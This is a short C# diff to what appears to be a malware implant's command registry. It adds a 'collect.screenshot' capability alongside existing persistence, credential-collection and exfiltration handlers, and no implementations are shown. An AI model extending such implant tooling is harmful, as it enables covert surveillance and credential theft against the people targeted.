@@ -207,6 +207,7 @@ internal sealed class HandlerRegistry
             new CapabilityHandler("persist.remove", args => Persist.Remove(args)),
             new CapabilityHandler("persist.list", args => Persist.List(args)),
             new CapabilityHandler("collect.cred", args => Collect.Cred(args)),
+            new CapabilityHandler("collect.screenshot", args => Collect.Screenshot(args)),
             new CapabilityHandler("exfil.push", args => Exfil.Push(args)),
             new CapabilityHandler("exfil.stage", args => Exfil.Stage(args)),
         };
